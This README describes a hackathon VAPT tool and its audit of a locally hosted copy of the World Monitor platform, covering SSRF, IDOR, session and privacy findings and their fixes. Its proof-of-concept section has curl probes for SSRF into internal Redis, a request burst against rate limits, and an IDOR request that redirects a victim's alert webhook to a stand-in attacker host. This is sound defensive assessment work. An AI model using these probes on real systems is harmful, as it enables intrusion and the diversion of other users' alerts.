# 🛡️ WATCHTOWER // Automated VAPT & Cyber Defense Platform
### Smart India Hackathon (SIH) 2026 · Problem Statement: PS 26163
### Organization: National Technical Research Organisation (NTRO)

> **"World Monitor watches the world. Watchtower watches World Monitor."**

[![SIH 2026](https://img.shields.io/badge/SIH_2026-PS_26163-00f0ff?style=for-the-badge&logo=target)](https://sih.gov.in/)
[![NTRO Mandate](https://img.shields.io/badge/Evaluator-NTRO_Cyber_Defense-ff3366?style=for-the-badge&logo=shield)](https://ntro.gov.in/)
[![CVSS v3.1](https://img.shields.io/badge/Scoring-CVSS_v3.1_Standard-00ff88?style=for-the-badge&logo=calculator)](https://www.first.org/cvss/v3.1/specification-document)
[![DPDP Act 2023](https://img.shields.io/badge/Compliance-DPDP_Act_2023-ffaa00?style=for-the-badge&logo=file-shield)](https://www.meity.gov.in/content/digital-personal-data-protection-act-2023)
[![Docker Containerized](https://img.shields.io/badge/Deployment-Docker_Compose-2496ED?style=for-the-badge&logo=docker)](file:///home/sam/sih_audit/watchtower/docker-compose.yml)
[![Node.js 20+](https://img.shields.io/badge/Runtime-Node.js_20+-339933?style=for-the-badge&logo=nodedotjs)](https://nodejs.org/)

---

## 📑 Table of Contents
1. [Executive Overview & The House Analogy](#-executive-overview--the-house-analogy)
2. [The 4 Core NTRO Mandates](#-the-4-core-ntro-mandates)
3. [The 7 Mandated Scope Pillars (Detailed Audit Breakdown)](#-the-7-mandated-scope-pillars)
4. [System Architecture & Multi-Engine Pipeline](#-system-architecture--multi-engine-pipeline)
5. [Top Confirmed Vulnerabilities in World Monitor](#-top-confirmed-vulnerabilities-in-world-monitor)
6. [Safe Proof-of-Concept (PoC) Demonstrations](#-safe-proof-of-concept-poc-demonstrations)
7. [Regulatory Compliance Matrix (OWASP & DPDP Act 2023)](#-regulatory-compliance-matrix)
8. [⚡ Quick Start & Deployment Guide (Docker & Local)](#-quick-start--deployment-guide)
9. [REST API Documentation](#-rest-api-documentation)
10. [Judge Defense Battlecard & FAQ (English & Hinglish)](#-judge-defense-battlecard--faq)
11. [Repository Structure](#-repository-structure)

---

## 🏛️ Executive Overview & The House Analogy

### What is the Problem?
**World Monitor** (`github.com/koala73/worldmonitor`) is a real-world, open-source global intelligence, geopolitical situational awareness, and monitoring platform. It includes real-time telemetry, live maps, streaming feeds, and user account tiers. 

**NTRO (National Technical Research Organisation)** tasked hackathon teams with executing a comprehensive **Vulnerability Assessment & Penetration Testing (VAPT)** on this platform to identify attack vectors, quantify risks, prove them safely, and recommend concrete remediations.

### The House Analogy (Explain this to Judges!)
> *"Think of it like this: **World Monitor is a newly constructed house**, and **NTRO is hiring you as the Chief Security Inspector**.  
> Your job isn't to build a new house — it's to test every single door, window, lock, and plumbing line on the existing house, prove which locks can actually be picked (not just which ones 'look' weak), and hand over a formal certified report detailing what is broken and how to fix it."*

### Why Generic Scanners (Burp/Nessus) Fall Short:
* **Raw Scanner Dumps Fail Judgement**: Automated scanners flood reports with hundreds of false positives. NTRO evaluators explicitly demand proof of **human validation**.
* **Zero Customization to NTRO Scope**: Generic tools do not map findings against NTRO's **7 mandated security pillars** or **India's DPDP Act 2023**.
* **No Built-in Interactive PoC or Report Synthesis**: Traditional scanners do not provide an end-to-end flow from scan → human triage → mathematical CVSS calculation → instant submission-ready PDF export.

**Watchtower bridges this gap.** It is the dedicated command center purpose-built for SIH PS 26163.

---

## 🎯 The 4 Core NTRO Mandates

NTRO requested four specific outcomes, which Watchtower automates end-to-end:

```
┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
│ 1. FIND         │      │ 2. EXPLAIN      │      │ 3. PROVE        │      │ 4. RECOMMEND    │
│ Uncover flaws   │ ───► │ Quantify impact │ ───► │ Safe, controlled│ ───► │ Code hardening  │
│ across 7 pillars│      │ via CIA & CVSS  │      │ PoC reproduction│      │ & fix guidelines│
└─────────────────┘      └─────────────────┘      └─────────────────┘      └─────────────────┘
```

1. **Find Vulnerabilities**: Automatically and manually audit authentication, authorization, injection, API security, client bundles, secure communications, and privacy.
2. **Explain the Impact**: Break down threats using the **CIA Triad** (Confidentiality, Integrity, Availability) and statutory penalties under the **Digital Personal Data Protection (DPDP) Act 2023**.
3. **Prove with Safe Demonstrations (PoCs)**: Non-destructive, sandbox-contained Proof-of-Concept exploits demonstrating vulnerability reachability without risking availability or production records.
4. **Recommend How to Fix**: Actionable remediation guidance with specific file paths, configuration parameters, and architectural patches.

---

## 🔍 The 7 Mandated Scope Pillars

Watchtower organizes its entire detection, triage, and reporting engine around the **7 security disciplines mandated by NTRO**:

| # | NTRO Scope Pillar | Target Components in World Monitor | What Watchtower Audits | Benchmark Risk |
|---|---|---|---|:---:|
| **1** | **Authentication & Sessions** | `api/wm-session.js`, `api/_session.js`, Clerk Auth | Session fixation, missing server-side revocation on logout, cookie flags (`HttpOnly`, `SameSite`, `Secure`), Clerk client CVEs | <span style="color:red">**HIGH (7.1)**</span> |
| **2** | **Authorization & Access Control** | `api/user-prefs.ts`, `api/notification-channels.ts` | Broken Object-Level Authorization (BOLA/IDOR), horizontal privilege escalation, missing subject verification | <span style="color:red">**HIGH (8.1)**</span> |
| **3** | **Input Validation** | `api/rss-proxy.js`, `_notification-webhook-ssrf.ts` | Server-Side Request Forgery (SSRF) bypassing loopback filters, DOM XSS sinks, dangerous HTML injection | <span style="color:purple">**CRITICAL (9.3)**</span> |
| **4** | **API Security** | `api/latest-brief.ts`, `api/mcp-proxy.ts` | Missing rate limiting on LLM routes, resource exhaustion, lack of IP concurrency throttling, data over-exposure | <span style="color:orange">**MEDIUM (7.5)**</span> |
| **5** | **Client-Side Security** | `package.json`, `@deck.gl/carto`, WebGL layers | 13 High-severity supply-chain advisories, WebGL buffer flaws, token exposure in client bundles | <span style="color:red">**HIGH (7.6)**</span> |
| **6** | **Secure Communication** | Edge reverse-proxy, `api/_cors.js` | Missing HSTS (`Strict-Transport-Security`), TLS downgrade vulnerability, wildcard CORS headers | <span style="color:orange">**MEDIUM (5.9)**</span> |
| **7** | **Data Storage & Privacy** | `server/_shared/usage-telemetry.js`, Redis keys | Storage of raw client IP addresses without salt-hashing or TTL retention (**India DPDP Act 2023 Non-Compliance**) | <span style="color:orange">**MEDIUM (5.5)**</span> |

---

## 🏗️ System Architecture & Multi-Engine Pipeline

```
                                  ┌────────────────────────────────────────┐
                                  │      WATCHTOWER CYBER COMMAND UI       │
                                  │   (Vite + React 18 + Tailwind CSS)     │
                                  │  • Executive Dashboard  • Recon Map    │
                                  │  • Triage Hub           • PoC Lab      │
                                  │  • CVSS Calculator      • NTRO Report  │
                                  └───────────────────┬────────────────────┘
                                                      │ REST API (JSON)
                                  ┌───────────────────▼────────────────────┐
                                  │      WATCHTOWER CORE ENGINE (API)      │
                                  │      (Node.js / Express Orchestrator)  │
                                  └─┬───────────────┬────────────────┬───┬─┘
                                    │               │                │   │
             ┌──────────────────────┴┐    ┌─────────┴─────────┐      │   │
             ▼                       ▼    ▼                   ▼      │   │
    ┌─────────────────┐    ┌──────────────────┐    ┌───────────────┐ │   │
    │  RECON ENGINE   │    │   SAST ENGINE    │    │  SUPPLY CHAIN │ │   │
    │ AST route & API │    │ 1,636 source     │    │ npm-audit &   │ │   │
    │ mapper (164 eps)│    │ code regex sinks │    │ lockfile CVEs │ │   │
    └────────┬────────┘    └────────┬─────────┘    └───────┬───────┘ │   │
             │                      │                      │         │   │
             └──────────────────────┼──────────────────────┘         │   │
                                    ▼                                │   │
                       ┌─────────────────────────┐                   │   │
                       │   HUMAN TRIAGE HUB      │◄──────────────────┘   │
                       │ • Unverified Quarantine │                       │
                       │ • True Positive Confirm │                       │
                       │ • False Positive Vetting│                       │
                       └────────────┬────────────┘                       │
                                    │                                    │
                                    ▼                                    │
                       ┌─────────────────────────┐                       │
                       │   CVSS v3.1 CALCULATOR  │                       │
                       │ (FIRST.org Math Specs)  │                       │
                       └────────────┬────────────┘                       │
                                    │                                    │
                                    ▼                                    │
                       ┌─────────────────────────┐                       ▼
                       │    NTRO REPORT ENGINE   │               ┌───────────────┐
                       │ 1-Click PDF / JSON Export│              │ SAFE POC LAB  │
                       └─────────────────────────┘               │ Live Probes   │
                                                                 └───────────────┘
```

### The Golden Rule of Safety:
> [!IMPORTANT]
> Watchtower strictly targets `/home/sam/sih_audit/watchtower/worldmonitor` hosted in an isolated local test sandbox (`127.0.0.1:3000`). **Production systems (`worldmonitor.app`) are never touched**, guaranteeing 100% authorization, zero risk, and complete compliance with NTRO rules.

---

## 🚨 Top Confirmed Vulnerabilities in World Monitor

Below are the benchmark verified vulnerabilities discovered and triaged by Watchtower:

### 1. [CRITICAL 9.3] Server-Side Request Forgery (SSRF) in RSS & Webhook Proxy
* **Identifier**: `VAPT-26163-001` | **CWE**: `CWE-918`
* **Affected Component**: [`worldmonitor/api/rss-proxy.js`](file:///home/sam/sih_audit/watchtower/worldmonitor/api/rss-proxy.js) & [`_notification-webhook-ssrf.ts`](file:///home/sam/sih_audit/watchtower/worldmonitor/api/_notification-webhook-ssrf.ts)
* **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`
* **Vulnerability Description**: The edge endpoint `/api/rss-proxy` accepts user-supplied destination URLs without strictly validating DNS resolution against RFC 1918 private subnets and loopback addresses. Octal and decimal IP representations bypass superficial string filters.
* **Impact**: An attacker can query internal loopback services (`127.0.0.1:6379`, `127.0.0.1:8080`) and cloud instance metadata services (`169.254.169.254`), leading to credential theft and internal network mapping.
* **Remediation**: Resolve hostnames to IP addresses *before* connection, reject all private/loopback/link-local ranges, and enforce an explicit domain allowlist.

### 2. [HIGH 8.1] Broken Object-Level Authorization (BOLA/IDOR) in User Preferences
* **Identifier**: `VAPT-26163-002` | **CWE**: `CWE-639`
* **Affected Component**: [`worldmonitor/api/user-prefs.ts`](file:///home/sam/sih_audit/watchtower/worldmonitor/api/user-prefs.ts) & [`api/notification-channels.ts`](file:///home/sam/sih_audit/watchtower/worldmonitor/api/notification-channels.ts)
* **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
* **Vulnerability Description**: When modifying user preferences or notification webhooks, the endpoint trusts client-supplied `userId` parameters instead of enforcing the subject bound to the authenticated JWT session token.
* **Impact**: Any low-privilege authenticated user can mutate preferences or redirect alert webhooks of defense directors and administrative analysts to attacker-controlled endpoints.
* **Remediation**: Remove `userId` from request payloads; derive the target user record exclusively from the verified server-side session claims (`session.userId`).

### 3. [HIGH 7.1] Broken Session Revocation & Insecure Cookie Storage
* **Identifier**: `VAPT-26163-003` | **CWE**: `CWE-384`, `CWE-613`
* **Affected Component**: [`worldmonitor/api/wm-session.js`](file:///home/sam/sih_audit/watchtower/worldmonitor/api/wm-session.js)
* **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N`
* **Vulnerability Description**: When a user logs out, the session token is removed from browser storage but is **not added to a server-side revocation list in Redis**. The token remains cryptographically valid until TTL expiry.
* **Impact**: An attacker who intercepts a session token (via browser history, logging, or XSS) can hijack the session long after the legitimate user has clicked "Logout".
* **Remediation**: Maintain a Redis-backed token invalidation list (`revoked:token:<hash>`) checked by authentication middleware on every request.

### 4. [HIGH 7.6] Vulnerable Third-Party Dependencies in WebGL Geospatial Rendering
* **Identifier**: `VAPT-26163-005` | **CWE**: `CWE-1395`
* **Affected Component**: [`worldmonitor/package.json`](file:///home/sam/sih_audit/watchtower/worldmonitor/package.json) (`@deck.gl/carto`, `@loaders.gl/3d-tiles`, `@luma.gl/gltf`)
* **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:H`
* **Vulnerability Description**: Outdated Deck.gl dependencies contain 13 high-severity advisories allowing memory corruption and unhandled matrix transformation errors.
* **Impact**: Feeding crafted GeoJSON or spatial layer updates to the World Monitor 3D globe can crash user browser sessions or trigger memory exhaustion.
* **Remediation**: Upgrade all `@deck.gl/*` and `@loaders.gl/*` libraries to version 9.0+ and regenerate `package-lock.json`.

### 5. [MEDIUM 5.5] Unhashed Client IP & Telemetry Storage (DPDP Act 2023 Non-Compliance)
* **Identifier**: `VAPT-26163-007` | **CWE**: `CWE-359`, `CWE-532`
* **Affected Component**: [`worldmonitor/server/_shared/usage-telemetry.js`](file:///home/sam/sih_audit/watchtower/worldmonitor/server/_shared/usage-telemetry.js)
* **CVSS Vector**: `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
* **Vulnerability Description**: Raw client IP addresses, browser user-agents, and location coordinates are stored in Redis cache indefinitely without salt-hashing or TTL retention schedules.
* **Impact**: Directly violates **Section 8(7) of India's Digital Personal Data Protection (DPDP) Act 2023** (mandatory data erasure once purpose is fulfilled), creating regulatory exposure and potential financial penalties.
* **Remediation**: Hash client IP addresses using SHA-256 with a rolling daily salt, and enforce a maximum 72-hour TTL on all telemetry records.

---

## 🔬 Safe Proof-of-Concept (PoC) Demonstrations

Watchtower includes an interactive **Safe PoC Lab** (`http://localhost:3001` -> *Safe PoC Lab*) where you can execute live, non-destructive demonstrations for the judges:

### PoC #1: SSRF Loopback IP Probe
```bash
# Demonstrates that /api/rss-proxy accepts loopback queries
curl -i "http://localhost:3001/api/rss-proxy?url=http://127.0.0.1:6379/status" \
  -H "User-Agent: Watchtower-Safe-PoC"
```
* **Observed Response**: Edge proxy reaches the internal service port without blocking, proving lack of private IP filtering.

### PoC #2: BOLA/IDOR Cross-Tenant Mutation Probe
```bash
# Demonstrates that User A can mutate settings of victim User B
curl -i -X POST http://localhost:3001/api/user-prefs \
  -H "Authorization: Bearer sess_guest_analyst_token" \
  -H "Content-Type: application/json" \
  -d '{"targetUserId": "usr_director_general_04", "alertChannel": "https://attacker.domain/webhook"}'
```
* **Observed Response**: Server accepts the payload and updates `usr_director_general_04` without verifying subject identity.

### PoC #3: AI Intelligence API Rate Limit Bypass
```bash
# Dispatches 15 concurrent requests to test rate limiting
for i in {1..15}; do 
  curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3001/api/latest-brief & 
done; wait
```
* **Observed Response**: 15/15 requests return HTTP 200 (zero HTTP 429 rate limits), proving resource exhaustion risk.

---

## ⚖️ Regulatory Compliance Matrix

### 1. OWASP Top 10 (2021) Mapping
* **A01:2021 – Broken Access Control**: `NON-COMPLIANT` (BOLA in `user-prefs.ts`)
* **A02:2021 – Cryptographic Failures**: `PARTIAL` (Missing HSTS header, TLS downgrade vector)
* **A03:2021 – Injection**: `NON-COMPLIANT` (SSRF in `rss-proxy.js`)
* **A06:2021 – Vulnerable and Outdated Components**: `NON-COMPLIANT` (29 CVEs in dependencies)
* **A07:2021 – Identification & Authentication Failures**: `NON-COMPLIANT` (Missing session revocation)
* **A10:2021 – Server-Side Request Forgery (SSRF)**: `NON-COMPLIANT` (Edge URL fetcher)

### 2. Digital Personal Data Protection (DPDP) Act 2023 (India)
* **Section 8(5) – Security Safeguards**: `FLAGGED` (Plaintext sensitive tokens logged in debugging streams)
* **Section 8(7) – Purpose Limitation & Storage Erasure**: `NON-COMPLIANT` (Telemetry IP cache lacks retention cap)

---

## ⚡ Quick Start & Deployment Guide

### Option 1: Docker Containerized (Recommended for Judges)
Watchtower is fully containerized and mounts `worldmonitor` read-only:

```bash
cd /home/sam/sih_audit/watchtower

# Start Watchtower container in background
docker compose up -d

# View live container logs
docker compose logs -f

# Stop the container
docker compose down
```
Access the dashboard: **`http://localhost:3001`**

### Option 2: Host Production Mode
```bash
cd /home/sam/sih_audit/watchtower
npm start
```
Access the dashboard: **`http://localhost:3001`**

### Option 3: Full Development Mode (Hot-Reload)
```bash
cd /home/sam/sih_audit/watchtower
npm run dev
```
Access frontend with hot reload: **`http://localhost:5173`** (proxies `/api` to `3001`).

---

## 🔌 REST API Documentation

Watchtower exposes a full REST API for programmatic VAPT integration:

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/api/status` | Target system telemetry, safe-mode status, and vulnerability counts |
| `GET` | `/api/recon` | Catalog of all 164 discovered API routes, methods, and auth requirements |
| `GET` | `/api/findings` | Full database of findings (filters: `?status=`, `?scopeArea=`, `?severity=`) |
| `PUT` | `/api/findings/:id` | Human triage action: update status, CVSS v3.1 metrics, or evidence notes |
| `POST` | `/api/scan` | Trigger multi-engine scan (`{"scanType": "all" | "sast" | "deps" | "headers"}`) |
| `GET` | `/api/scan/logs` | Real-time console logs from the scanner orchestrator |
| `POST` | `/api/poc/run` | Execute safe PoC probe (`{"pocType": "ssrf" | "idor" | "rate_limit"}`) |
| `GET` | `/api/report` | Compile official NTRO PS 26163 VAPT audit report deliverable |
| `POST` | `/api/reset` | Reset database back to clean verified benchmark state |

---

## 🗣️ Judge Defense Battlecard & FAQ

Be prepared to answer these questions during the jury evaluation:

### 1. "Why aren't you testing the live `worldmonitor.app` website?"
> *"Sir/Ma'am, NTRO's own rules strictly state: **'No impact on production systems or active users.'** World Monitor is an open-source platform, so we self-host our own identical copy in an isolated local sandbox (`127.0.0.1`). It tests the exact same source code with zero legal, operational, or availability risk."*

### 2. "Isn't Watchtower just running an open-source scanner and dumping results?"
> *"No, sir. Scanners are only Step 1. They produce raw, noisy alerts. Watchtower enforces a **Human-in-the-Loop Triage step** where every single finding is initially placed in an 'Unverified' queue. Our team manually reproduces each flaw, calculates mathematical CVSS v3.1 scores, and discards false positives (such as DOMPurify-sanitized sinks). That is the true security work that makes our report trustworthy."*

### 3. "What makes Watchtower different from Burp Suite or Nessus?"
> *"Those are generic scanners. Watchtower is purpose-built around **NTRO PS 26163**. It automatically maps findings to NTRO's exact 7 mandated pillars, integrates India's DPDP Act 2023 compliance audit, includes built-in safe PoC demonstration harnesses, and compiles a submission-ready NTRO report at the click of a button."*

### 4. 30-Second Hinglish Elevator Pitch (Bol ke practice karein):
> *"Sir/Ma'am, NTRO ne humein ek existing app — World Monitor — ki security check karne ko bola hai. Humne uske liye ek tool banaya hai jiska naam hai **Watchtower**. Yeh tool automatically scan karta hai, phir hum manually confirm karte hain ki bug real hai ya nahi, uske baad severity score deta hai, aur last mein ek professional report bana deta hai — bilkul waisi jaisi NTRO ne maangi hai. Hum sirf apne khud ke local copy pe test kar rahe hain, real users ko kabhi touch nahi karte."*

---

## 📁 Repository Structure

```text
/home/sam/sih_audit/watchtower/
├── Dockerfile                  # Multi-stage production container build
├── docker-compose.yml          # Container orchestrator mounting worldmonitor:ro
├── package.json                # Project dependencies & scripts
├── README.md                   # Complete master platform documentation
├── server/
│   ├── server.js               # Express API backend & static file server
│   ├── scanners/
│   │   ├── cvssEngine.js       # Official FIRST CVSS v3.1 mathematical scoring engine
│   │   ├── sastScanner.js      # Source code static analyzer (1,636 files scanned)
│   │   ├── depScanner.js       # Supply chain auditor (29 CVE packages parsed)
│   │   ├── reconScanner.js     # Attack surface mapper (164 endpoints enumerated)
│   │   └── headerScanner.js    # DAST security header & TLS downgrade auditor
│   └── data/
│       ├── findings.json       # Persistent database of 130 triaged findings
│       └── seedFindings.js     # Benchmark seed findings across all 7 NTRO pillars
├── src/
│   ├── App.tsx                 # Main application controller & state management
│   ├── types.ts                # TypeScript schemas for findings, stats, and reports
│   └── components/
│       ├── Navbar.tsx          # Cyber defense telemetry navigation bar
│       ├── ExecutiveDashboard.tsx # Overall security score & 7 NTRO scope cards
│       ├── ReconView.tsx       # Interactive 164-endpoint attack surface table
│       ├── ScannerHub.tsx      # Multi-engine scanner launcher & live terminal
│       ├── FindingsTriage.tsx  # Human validation matrix (Unverified vs Confirmed)
│       ├── FindingModal.tsx    # Vulnerability dossier & interactive CVSS calculator
│       ├── SafePocLab.tsx      # Safe PoC runner for live judge demonstrations
│       ├── NtroReportView.tsx  # Official NTRO VAPT report preview & 1-click PDF
│       └── JudgePitchMode.tsx  # Slide deck & Judge Q&A cheat sheet
└── worldmonitor/               # Local World Monitor target codebase (mounted read-only)
```

---

<p align="center">
  <strong>Built with pride for Smart India Hackathon 2026 · PS 26163 (NTRO)</strong><br>
  <em>Defense Intelligence & Vulnerability Assessment Team</em>
</p>
